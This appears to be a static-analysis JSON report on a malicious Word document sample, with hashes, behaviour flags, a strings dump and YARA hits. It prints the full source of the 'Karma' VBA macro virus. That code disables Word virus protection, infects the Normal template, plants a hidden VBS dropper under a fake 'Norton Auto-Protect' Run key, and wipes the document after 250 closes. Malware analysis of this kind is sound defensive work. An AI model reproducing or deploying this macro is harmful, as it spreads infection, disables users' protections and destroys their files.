{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CodeModule": "May attempt to modify the VBA code",
            "CreateObject": "May create an OLE object",
            "Document_Close": "Runs when the Word document is closed",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Environ": "May read system environment variables",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "Run": "May run an executable file or a system command",
            "Shell": "May run an executable file or a system command",
            "System": "May run an executable file or a system command on a Mac",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows"
        },
        "macro": "Private Sub Document_Open()\nOn Error Resume Next\n' The Karma Virus v1.00 with VBS Backup/Payload\n' By WalruS 09/00\n \n    If ActiveDocument.Name = \"Document1\" Then Exit Sub\n    \n    Set Nor = NormalTemplate.VBProject.VBComponents(1).CodeModule\n    Set Doc = ActiveDocument.VBProject.VBComponents(1).CodeModule\n\n    With Options\n        .VirusProtection = False\n        .ConfirmConversions = False\n        .SaveNormalPrompt = False\n    End With\n\n    Application.DisplayStatusBar = False\n\n    System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") = 1&\n    System.PrivateProfileString(\"\", \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Norton Auto-Protect\") = \"C:\\Windows\\Backup.vbs\"\n\n    Open \"C:\\Windows\\Karma.drv\" For Output As #1\n    Print #1, VBProject.VBComponents(1).CodeModule.Lines(1, 85)\n    Close #1\n    SetAttr (\"C:\\Windows\\Karma.drv\"), 6\n\n    Nor.DeleteLines 1, Nor.CountOfLines: Nor.AddFromFile (\"C:\\Windows\\Karma.drv\")\n    Doc.DeleteLines 1, Doc.CountOfLines: Doc.AddFromFile (\"C:\\Windows\\Karma.drv\")\n\n    Open \"C:\\Windows\\Backup.vbs\" For Output As #1\n        Print #1, \"' Backup.vbs for Karma by The WalruS\"\n        Print #1, \"On Error Resume Next\"\n        Print #1, \"Dim WSHShell\"\n        Print #1, \"Dim Shortcut, Fave\"\n        Print #1, \"Set WSHShell = WScript.CreateObject(\"\"WScript.Shell\"\")\"\n        Print #1, \"Set Backup = WScript.CreateObject(\"\"Word.Application\"\")\"\n        Print #1, \"Backup.Options.VirusProtection = False\"\n        Print #1, \"Backup.Options.SaveNormalPrompt = False\"\n        Print #1, \"For x = 1 To Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines\"\n        Print #1, \"Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1\"\n        Print #1, \"Next\"\n        Print #1, \"Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (\"\"C:\\Windows\\Karma.drv\"\")\"\n        Print #1, \"Backup.Application.Quit\"\n        Print #1, \"Fave = (\"\"C:\\Windows\\Favorites\"\")\"\n        Print #1, \"Set Shortcut = WSHShell.CreateShortcut(Fave & \"\"\\The WalruS.url\"\")\"\n        Print #1, \"Shortcut.TargetPath = WSHShell.ExpandEnvironmentStrings(\"\"www.WalruS.8k.com\"\")\"\n        Print #1, \"Shortcut.Save\"\n        Print #1, \"WSHShell.RegWrite \"\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner\"\", \"\"The WalruS\"\"\"\n        Print #1, \"If Minute(Now) = 30 Then\"\n        Print #1, \"WSHShell.RegWrite \"\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoClose\"\", \"\"1\"\"\"\n        Print #1, \"MsgBox \"\"Microsoft Windows Shutdown Error\"\", vbExclamation, \"\"Bad Karma\"\"\"\n        Print #1, \"Else\"\n        Print #1, \"WSHShell.RegWrite \"\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoClose\"\", \"\"WalruS\"\"\"\n        Print #1, \"End If\"\n    Close #1\n    SetAttr (\"C:\\Windows\\Backup.vbs\"), 6\n    \nEnd Sub\n\nPrivate Sub Document_Close()\n    On Error Resume Next\n    sFileName = Environ(\"Windir\")\n    If Right(sFileName, 1) <> \"\\\" Then\n    sFileName = sFileName & \"\\\"\n    End If\n    \n    sFileName = sFileName & \"WIN.INI\"\n\n    sCounter = System.PrivateProfileString(sFileName, ActiveDocument.FullName, \"Counter\")\n    sCounter = Val(sCounter) + 1\n    System.PrivateProfileString(sFileName, ActiveDocument.FullName, \"Counter\") = sCounter\n    If Val(sCounter) > \"250\" Then\n        Selection.WholeStory\n        Selection.Delete Unit:=wdCharacter, Count:=1\n        Set myRange = ActiveDocument.Paragraphs(1).Range\n            With myRange.Font\n                .Bold = True\n                .Name = \"Space Woozies\"\n                .Size = 100\n            End With\n        Selection.TypeText \"This Document has expired due to Bad Karma\"\n    End If\n    If ActiveDocument.Saved = False Then ActiveDocument.Save\nEnd Sub\n\n"
    },
    "filename": "VirusShare_43ddaeb1d79828dd77bc7d83513b09e1",
    "filesize": 38912,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.90, Code page: 1252, Author: The WalruS, Template: Normal.dot, Last Saved By: The WalruS, Revision Number: 3, Name of Creating Application: Microsoft Word 9.0, Total Editing Time: 01:00, Create Time/Date: Sun Aug 27 18:49:00 2000, Last Saved Time/Date: Sun Aug 27 18:53:00 2000, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "43ddaeb1d79828dd77bc7d83513b09e1",
        "sha1": "7a3bc6459527c893167c46f1429bf49089f9d78f",
        "sha256": "9a0081377d763c1ffd633bc3e3fbe08a2bbf2ca0c0075a971cfee2aeaedea0f3"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjU",
            "/ =!",
            "The WalruS",
            "Normal.dot",
            "The WalruS",
            "Microsoft Word 9.0",
            "WalruS    Loves u For try",
            "Title",
            "\u0505.VBProject",
            "@Compon@ys",
            "(1).Code`ModulW",
            ">OptionsC",
            "Confirm",
            "vers",
            "\tSave7",
            "End ",
            "Applica\".Dis@",
            "yStatusB",
            "Syst",
            "em.@",
            "ng(\"\"",
            ", \"HKEY_",
            "CURRENT_",
            "USER\\Sof",
            "tw\\Micr",
            "\\Offi",
            "ce\\9.0\\W",
            "ord\\Secu",
            "rity",
            "Level\")",
            "LOCAL_MA CHINE",
            "ndows\\Cu",
            "rrvVO\\Ru",
            "Kton Aputo-5",
            "C:\\%",
            "T.vbns",
            "b\\.@drv\" F`O",
            "utput As #1#",
            "@'nt",
            "\\N.LineP, 85kA@<Clz\tQ",
            "), 6<@",
            ".@Delete",
            "1,Aa[untO",
            "AddFromF@;",
            "n*.*\"",
            "+\"f'A5 f0#by",
            "Dim WSHS",
            "hell7",
            "rtcut, F",
            "%\t^WSc ript.",
            "eOb!D`k",
            "\")w\t%8\t@n.~\"\t.",
            "1 ToE9W",
            ".I[z",
            "p6\"ap",
            "le.5_@H",
            "\t`Quit",
            "((Q@",
            "o[esO$CN\"-U0",
            "\"\\#:.url",
            "5.TargPetPa=",
            "andEnviXron",
            "8k.com?",
            "RegW",
            "2phLph|\\p",
            "i0v``OwnerBue9\u0510\"\"",
            "`MiBn",
            "(Nows30R",
            "ip\"{4CU",
            "sto|sPo!@ies\\",
            "lorer\\Noi",
            "3'MsgBo",
            "y Sh<ut z",
            "vbtEx0m",
            "C%\t\t`If\tO|",
            "vO9\u0446S|j",
            "\u045bSubA}",
            "s}T2(\"a",
            "irx!",
            " %Right(",
            ", 1) <> |\"\\#z",
            "WIN.INI",
            ",xFul#",
            "Val(",
            ") + ",
            "2560i",
            ".Whoory",
            "c Unit",
            ":=wdCharacter, B",
            "t myRang<P",
            "graphB",
            ".Fon$",
            ".BolG",
            "WoozPDC\"",
            ".Siz",
            "Ty8peT  has expi`U due tqD",
            "If Activ",
            "eDocumen",
            "t.Saved ",
            "= False ",
            "Then",
            "nd Sub",
            "@7BP#$-tHs%K9F\ue5d9%",
            "@7BP#$",
            " The Karma Virus v1.00 with VBS Backup/Payload",
            " By WalruS 09/00",
            "Document1",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security",
            "Level",
            "C:\\Windows\\Backup.vbs",
            "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "Norton Auto-Protect",
            "C:\\Windows\\Karma.drv",
            "C:\\Windows\\Karma.drv",
            "C:\\Windows\\Karma.drv",
            "C:\\Windows\\Karma.drv",
            "C:\\Windows\\Backup.vbs",
            "' Backup.vbs for Karma by The WalruS",
            "On Error Resume Next",
            "Dim WSHShell",
            "Dim Shortcut, Fave",
            "Set WSHShell = WScript.CreateObject(\"WScript.Shell\")",
            "Set Backup = WScript.CreateObject(\"Word.Application\")",
            "Backup.Options.VirusProtection = False",
            "Backup.Options.SaveNormalPrompt = False",
            "For x = 1 To Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines",
            "Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1",
            "Next",
            "Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (\"C:\\Windows\\Karma.drv\")",
            "Backup.Application.Quit",
            "Fave = (\"C:\\Windows\\Favorites\")",
            "Set Shortcut = WSHShell.CreateShortcut(Fave & \"\\The WalruS.url\")",
            "Shortcut.TargetPath = WSHShell.ExpandEnvironmentStrings(\"www.WalruS.8k.com\")",
            "Shortcut.Save",
            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner\", \"The WalruS\"",
            "If Minute(Now) = 30 Then",
            "WSHShell.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoClose\", \"1\"",
            "MsgBox \"Microsoft Windows Shutdown Error\", vbExclamation, \"Bad Karma\"",
            "Else",
            "WSHShell.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoClose\", \"WalruS\"",
            "End If",
            "C:\\Windows\\Backup.vbs",
            "Windir$",
            "WIN.INI",
            "Counter",
            "Counter",
            "Space Woozies",
            "This Document has expired due to Bad Karma ",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VGlobal!",
            "Spac",
            "Crea",
            "tabl",
            "Pre decla",
            "BExp",
            "Temp",
            "lateDeri",
            "$CustomlizC1P",
            "Sub _Op",
            "en()",
            " Error R",
            "es Next",
            "' The ",
            "Ka Viru",
            "s v1.00 ",
            "with VBS",
            " Backup/Payload",
            "By Walru",
            "S 09/00",
            "   If Act",
            "1\"6n Ex",
            "Wordk",
            "Win16~",
            "Win32",
            "VBA6#",
            "Project1",
            "stdole`",
            "Project-",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Document_Open",
            "Documentj",
            "ActiveDocument\\",
            "Nor!",
            "NormalTemplateq",
            "VBProjectOh",
            "VBComponents",
            "CodeModule",
            "Options",
            "VirusProtectionoD",
            "ConfirmConversions",
            "SaveNormalPrompt\u02bc",
            "Application*",
            "DisplayStatusBar",
            "Systema",
            "PrivateProfileString[",
            "Lines",
            "SetAttrC",
            "DeleteLines",
            "CountOfLines!\\",
            "AddFromFileu",
            "Document_Close7\\",
            "sFileName",
            "Environ",
            "Right",
            "sCounter",
            "FullName\u041e",
            "SelectionZ",
            "WholeStory",
            "Deletex",
            "Unit",
            "wdCharacter",
            "Count0v",
            "myRange-",
            "Paragraphsf",
            "Range",
            "FontU",
            "Bold",
            "Size",
            "TypeText",
            "Savedd",
            "Save",
            "Itemz",
            "_B_var_Nor2w",
            "_B_var_DocA",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "c2.tlb#O",
            "LE Automation",
            "D@NormalDNABr",
            "A!OfficfOA`f",
            "!G{2DF",
            "8D04C-5B",
            "FA-101B-BDE5fAAd",
            "2fgra",
            "m Files\\",
            "Microsof",
            "MSO@9.DLL#",
            " @9.0 Ob",
            " LibraryCE",
            "aThisD",
            "ocumentGD",
            "h1sD",
            "uEeT",
            ",!x\"B",
            "ThisDocument",
            "ID=\"{8A1DC932-E993-4318-AAC0-D2904A81DC29}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "VersionCompati_",
            "VBE6.DLL",
            "MD-w",
            "\uaf9eA,k",
            "u-9\"Nt(",
            "Ur.?\u032dL",
            "WEKC{\":H",
            "%AXB",
            "@7BP#$",
            "-tHs%K9F\ue5d9%",
            "ble32=\"393222000\"",
            "CMG=\"A9AB708074807480748074\"",
            "DPB=\"52508B803581358135\"",
            "GC=\"FBF9227BCA7CCA7C35\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=22, 22, 574, 332, Z",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8",
            "*\\CNormalrU",
            "JB\"<U",
            "GMmr'GW",
            "ThisDocument",
            "Project",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA6\\VBE6.DLL",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD9.OLB",
            "Word",
            "C:\\WINDOWS\\SYSTEM\\stdole2.tlb",
            "stdole",
            "C:\\Program Files\\Microsoft Office\\Office\\MSO9.DLL",
            "Office",
            ":Y'D?,;K",
            "q@!%C",
            "bP\u0608c",
            "Document",
            "Document_Open",
            "Document_Close"
        ],
        "file": {
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA6\\VBE6.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSO9.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD9.OLB": "Autogen",
            "VBE6.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.293216",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
